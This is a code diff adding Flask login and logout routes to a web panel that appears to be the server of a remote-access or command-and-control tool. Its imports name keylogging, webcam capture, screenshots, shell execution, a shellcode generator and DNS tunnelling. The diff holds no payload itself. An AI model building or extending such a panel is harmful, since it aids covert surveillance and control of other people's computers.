@@ -11,8 +11,9 @@ import threading
 import requests
 from typing import Optional, Dict, List, Any
 
-from flask import Flask, render_template, request, jsonify
-from flask_login import LoginManager, login_required
+from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
+from flask_login import LoginManager, login_required, login_user, logout_user, current_user
+from werkzeug.security import check_password_hash
 
 # Configure logging
 logging.basicConfig(
@@ -37,6 +38,7 @@ from modules.process import list_processes, kill_process
 from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger
 from modules.files import list_directory, get_file_info, read_file, write_file, delete_file
 from modules.shell import execute
+from models import User, users
 
 # Initialize Flask app
 app = Flask(__name__)
@@ -47,6 +49,10 @@ login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = 'login'
 
+@login_manager.user_loader
+def load_user(user_id):
+    return User.get(user_id)
+
 # Initialize components
 shellcode_gen = ShellcodeGenerator()
 dns_tunnel = create_server("example.com")
@@ -56,7 +62,28 @@ agents = {}
 tasks = {}
 results = {}
 
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        
+        if username in users and check_password_hash(users[username], password):
+            user = User(username)
+            login_user(user)
+            return redirect(url_for('index'))
+        
+        flash('Invalid username or password')
+    return render_template('login.html')
+
+@app.route('/logout')
+@login_required
+def logout():
+    logout_user()
+    return redirect(url_for('login'))
+
 @app.route('/')
+@login_required
 def index():
     return render_template('index.html')
 
